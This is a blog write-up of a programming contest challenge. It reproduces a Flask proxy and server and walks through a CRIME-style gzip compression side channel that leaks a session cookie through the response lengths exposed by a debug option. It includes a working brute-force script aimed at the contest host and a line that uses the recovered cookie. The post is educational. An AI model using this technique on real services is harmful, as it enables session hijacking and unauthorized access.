---
title: "MegCup Geek Challenge Problem 3"
date: 2017-03-27 11:57:00 +0800
---

I saw this competition before. In the preliminary round there was a problem about converting polar coordinates to Cartesian coordinates. I got interested on a whim and solved it; [that one was relatively simple](https://gist.github.com/winguse/a517546e2f54b2dc4fdcf99c4af6e75d).

I had nothing to do on Sunday, so I went to look at the finals. I glanced through the problems: graph theory, number theory, dynamic programming, probability, computational geometry — I do not know those (and even if I once did, that knowledge is long dead), and I did not want to torture myself with them, so I just skimmed them. But problem three was kind of interesting, so I spent some time on it. [The problem is here](https://2017.megcup.com/problems/3). In case that site ever goes down, I will repeat it here:

In simple terms, there is a target service (you need to access one of its signed APIs) that requires cookie authentication, but you do not have the cookie. There is also a proxy service: if you access through it, you can skip the cookie, but you cannot reach the URL you actually need. The source code of both services was open-sourced. Py... Python. I really wanted to complain about this vernier-caliper language (or maybe I should complain about myself). It is a language I have never calmly learned, a language I have only ever been able to read, and [I recently even improvised a PR for Thumbor with it](https://github.com/thumbor/thumbor/pull/899).

I will paste both pieces of code here as well:

proxy.py

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from mysecret import get_signed_session_id_raw
from flask import Flask, request, make_response
import requests

import base64

app = Flask(__name__)

UPSTREAM_URL = 'http://localhost:38701'

@app.route("/")
def hello():
    return "online proxy usage: /&lt;username&gt;/&lt;page&gt;"

@app.route("/<username>/<page>", methods=['GET', 'POST'])
def proxy(username, page):
    try:
        page = page.strip()
        assert set(page).issubset(set(
            chr(i) for i in range(ord('a'), ord('z') + 1)))
        if page == 'signtoken':
            return make_response('permission denied', 403)

        sid = get_signed_session_id_raw(username)
        sid = base64.urlsafe_b64encode(sid).decode('utf-8')
        up_resp = requests.get(UPSTREAM_URL + '/' + page, params=request.args,
                               cookies={'sessionid': sid})

        # some debug pages may expose session id; strip them
        resp = up_resp.text.replace(sid, '<del>sessionid</del>')

        if request.form.get('debug'):
            resp += '<br /><hr>proxy debug<br />'
            resp += 'server response headers: <pre>{}</pre>'.format(
                up_resp.headers)

        return resp
    except:
        return 'error'


if __name__ == "__main__":
    app.run(debug=True, port=38700)
```

server.py

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from mysecret import check_session_id, signtoken as do_signtoken
from simpleeval import simple_eval

from flask import Flask, request, make_response
import functools

app = Flask(__name__)

def require_login(func):
    @functools.wraps(func)
    def work():
        try:
            sid = request.cookies.get('sessionid')
            if not sid or not check_session_id(sid):
                return make_response('please login first', 401)
            return func()
        except:
            return 'error'
    return work

@app.route("/")
def hello():
    return "Hello World!"

@app.route("/echo")
@require_login
def echo():
    return make_response("""
        <h1>echo page</h1>
        <h2>request headers</h2><pre>{}</pre><h2>args</h2><pre>{}</pre>
    """.format(request.headers,
               '\n'.join('{}: {}'.format(k, v)
                         for k, v in request.args.items())))

@app.route("/eval")
@require_login
def eval_():
    expr = request.args['expr']
    result = simple_eval(expr)
    return make_response("""
        <h1>eval page</h1>
        <pre>{} = {}</pre>
    """.format(expr, result))

@app.route("/signtoken")
@require_login
def signtoken():
    token = request.args['token']
    signature = do_signtoken(token)
    return "token: {}<br />signature: {}".format(token, signature)

if __name__ == "__main__":
    app.run(debug=True, port=38701)
```

At first glance, I noticed the `eval` thing. But that was a trap. At first I thought it would be easy — just execute a piece of Python code however I liked — and I happily went to send an HTTP request. Then I looked up [the Simple Eval package](https://github.com/danthedeckie/simpleeval) and discovered that it is very limited: it can only execute certain designated expressions. Clearly this was there to attract firepower, especially for someone like me who basically no longer knows either it or Python well at all (table-flipping should happen here).

So I kept looking at the `echo` API. Through the proxy it would echo the HTTP headers back. However, the crafty problem setter had replaced the `sid` we wanted. But after that there was a `debug` option that would print the upstream response headers — ah, that looked like a breakthrough. The slightly sneaky part was that this parameter had to be passed through a form, but that was not hard; just construct it a bit. Then I got the returned headers, but at first I could not see anything useful.

But in fact, it *was* useful! When I tried to crack it myself at noon, I noticed that the returned `Content-Length` was 240 bytes and `Content-Encoding` was gzip. And without the `debug` parameter, Chrome showed 223 bytes. In other words, because the problem setter had craftily replaced the `sid`, the gzipped data became 17 bytes shorter. So I could roughly guess the length of the `sid` string. Then I came up with an approach: brute-force that string. However — after thinking casually about brute-forcing 17 bytes, I gave up. That search space was too large. Then I wondered whether gzip might have some recovery behavior I could take advantage of, since I could make the server return arbitrary data and then observe whether my guess was correct. But I could not think of a way to enumerate one byte at a time, and the moment I thought of the 17-byte search space, I abandoned the idea.

![Idea](/images/2017-03-27-guess-size.jpg)

After that I tried a few other things, such as whether I could bypass the URL validation in `proxy.py`, but in the end it turned out that fake URLs like `%20` were useless. Then I started looking into whether this Python HTTP framework had some kind of overflow vulnerability, but I found nothing. Thinking that I should not waste the nice weather, I went out to play...

At almost 11 p.m., just before going to sleep, I remembered this again. I think the contest ended at 10 p.m., so I [went to check the ranking list](https://2017.megcup.com/ranklist). As usual, I ignored everything else and clicked open [the write-up from one expert who had solved problem three](https://2017.megcup.com/get_upload/bef8bce5c3e307a8cd4f3e4b9467eff3). Damn — the first thing I saw in that solution was an import of `zlib`. No way, right? Was it really the same brute-force idea I had? My mind panicked for a moment. But after reading more carefully, apparently not; those lines were all commented out. As I kept reading, I suddenly understood (which makes sense — there really was not any other information leak left). The solution was:

> Construct a string identical to the data returned by `echo`, then look at the server’s returned length and use that to choose the last character being guessed.

The reason is that data compression algorithms essentially group repeated patterns together. For example, if you transmit 100 copies of “ah”, then after compression it becomes something like “100 ahs”. Heh, sounds like nonsense, right? So if you construct two identical fragments, they will be merged. In this problem, the target fragment was:

> HEADER_IN_TEXT + SESSION_ID

So you can construct:

> HEADER_IN_TEXT + TRYING_CHARS

If the prefix of `TRYING_CHARS` matches `SESSION_ID`, then the common part of the whole data will be merged, and the returned length will become the smallest (because it can be compressed together). So that is the sneaky trick. Anyway, I rewrote the following code myself before going to sleep:

```python
import urllib
import urllib2
import re
import requests

# finally result
# r = requests.get('http://47.93.114.77:38701/signtoken', params={'token': '2d0a74300115d66e7a5d21e59bc20b53'}, headers={'Cookie': 'sessionid=ww6mveDaJESyPqfvcFKq1A=='})
# print r.content


zipBase=urllib.quote('''Accept: */*\r\nConnection: close\r\nUser-Agent: python-requests/2.13.0\r\nAccept-Encoding: gzip, deflate\r\nHost: localhost:38701\r\nCookie: sessionid=''')

chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='

def getdebug(url):
    test_data={'debug':'a'}
    test_data_urlencode = urllib.urlencode(test_data)
    req = urllib2.Request(url=url, data=test_data_urlencode)
    res_data = urllib2.urlopen(req)
    res = res_data.read()
    res = re.search(r"(?<='Content-Length': ').*(?=', 'Connection')", res)
    return int(res.group())


now=''
for i in range(30):
    min_size = 999999999999
    selected = '0'
    for j in chars:
        res = getdebug('http://47.93.114.77:38700/root/echo?a=' + zipBase + now + j)
        if (res < min_size):
            min_size = res
            selected = j
        # print 'trying', j, res
    now += selected
    print now
```

Once you see things like the end marker of gzip (for example an equals sign) and the length, you can roughly guess when the loop should stop. Of course, you can also determine it by checking `content-length`.

Then it reminded me of that string-compression interview question from Boss Sun when I joined Microsoft. I did know a little bit about this stuff, just not sensitively enough. Speaking of information security, this is a good example: even very simple things can cause information leakage. Similar cases include [the Heartbleed vulnerability](http://heartbleed.com/). [The expert’s code also cited something, and it turns out there was this whole story behind it as well](http://security.blogoverflow.com/2012/09/how-can-you-protect-yourself-from-crime-beasts-successor/).

That’s it.
